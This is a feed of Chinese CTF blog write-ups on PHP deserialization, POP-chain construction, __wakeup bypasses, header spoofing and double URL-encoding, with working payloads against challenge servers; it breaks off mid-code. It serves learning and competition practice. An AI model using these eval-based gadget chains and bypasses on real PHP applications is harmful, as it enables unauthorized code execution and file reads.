&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span>  // 当调用的成员方法不存在时调用此方法</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span>   //把一个对象当做函数去执行会调用此方法</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();    <span class="comment">//将$str1赋值为  类Getflag 的对象</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> start_gg;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>例子2</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>在 lemo类中调用得的是 normal类 但是在 evil类 中也有在normal类中的相同方法名 action<br>这时可以构造poc链来调用 evil类 中的 action方法<br>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo()"</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> lemon;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><h2 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h2><p>1、当成员属性数目大于实际数目时可绕过wakeup方法</p><p>2、CTF中成员属性数目前面多一个+可以绕过正则</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>D0g3平台一道很简单的反序列化的题<br>网址:<a href="http://120.79.33.253:9001/" target="_blank" rel="noopener">http://120.79.33.253:9001/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">$KEY = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php">$str = $_GET[<span class="string">'str'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure><p>原理:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$str = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str1 = serialize($str);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str1;   <span class="comment">// s:7:"D0g3!!!";</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str2 = unserialize($str1);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str2;  <span class="comment">// D0g3!!!</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload:</p><pre><code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/3674#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-0</a><br><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a><br><a href="http://php.net/manual/zh/language.oop5.serialization.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.serialization.php</a><br><a href="https://blog.csdn.net/qq_23937195/article/details/73027557" target="_blank" rel="noopener">https://blog.csdn.net/qq_23937195/article/details/73027557</a><br><a href="http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a><br><a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html</a><br><a href="https://www.anquanke.com/post/id/162300" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162300</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019杭电CTF HGAME Writeup</title>
      <link href="/2019/01/27/2019%E6%9D%AD%E7%94%B5CTF-HGAME-Writeup/"/>
      <url>/2019/01/27/2019%E6%9D%AD%E7%94%B5CTF-HGAME-Writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次AK了web…..<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaptvjruj311y0h3my1.jpg" alt=""></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h2><p>呜呜呜，Mki一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗T_T hint: 据当事人回忆，那个夜晚他正在用vim编写题目页面，似乎没有保存就关机睡觉去了,现在就是后悔，十分的后悔。</p><p>hint 是后来增加的 一开始做的时候就想到类vim文件泄露 可是当时没有 </p><p>第二天看了出了hint 说是vim  再进行 /.index.html.swp<br>成功下载出来 得到flag</p><h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><ol><li>默认是GET提交 改为POST提交<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaqfpvdlj30r70f7jse.jpg" alt=""></li><li>设置X-Forwarded-For:127.0.0.1<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaqwyns3j30vh0dogoc.jpg" alt=""></li><li>修改UA<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlarkhu5rj30yo0dndil.jpg" alt=""><ol start="4"><li>修改referer<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaryzf5sj30yx0d7wh3.jpg" alt=""><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2></li></ol></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;干巴爹&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><pre><code>$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</code></pre><p>对id进行url解码了一次<br>在数据传入php脚本进行数据处理时本身会被解码一次<br>这样就导致了二次编码注入</p><p>将vidar进行url编码两次提交<br>?id=%2576%2569%2564%2561%2572</p><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>在源代码看到f12.php<br>访问<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlasbk5cpj30n408imz9.jpg" alt=""><br>在返回包看到密码,提交</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlasvfnqej310m0btmz8.jpg" alt=""><br>访问iamflag.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlat857jaj30xl0ajmyw.jpg" alt=""></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><p>用stegsolve进行分析得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlatlcbwpj30r70l8wfd.jpg" alt=""></p><h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><p>是一个压缩包文件，解压发现文件错误<br>用winhex打开压缩包分析分析<br>发现文件头不是以 50 4B 03 04 开头<br>修改为50 4B 03 04 开头 即可 保存<br>解压发现要密码, 在注释里面看到密码 提交得到flag</p><p><strong>参考</strong>:<br><a href="https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019安恒杯一月新春贺岁赛writeup</title>
      <link href="/2019/01/27/2019%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%80%E6%9C%88%E6%96%B0%E6%98%A5%E8%B4%BA%E5%B2%81%E8%B5%9Bwriteup/"/>
      <url>/2019/01/27/2019%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%80%E6%9C%88%E6%96%B0%E6%98%A5%E8%B4%BA%E5%B2%81%E8%B5%9Bwriteup/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="babyGo（提交你找到的字符串的md5值）"><a href="#babyGo（提交你找到的字符串的md5值）" class="headerlink" title="babyGo（提交你找到的字符串的md5值）"></a>babyGo（提交你找到的字符串的md5值）</h2><p><strong>考点</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php反序列化</span><br><span class="line"><span class="keyword">POP</span>链构造</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing; </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> </span></span><br><span class="line"><span class="php">            &#123; </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $Input_data; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span> </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"./index.php"</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>flag的输出在cool类中的read方法中,但是在baby类中调用的是sec类的read方法</p><p><strong>POP链构造</strong><br>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来<br><strong>举例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    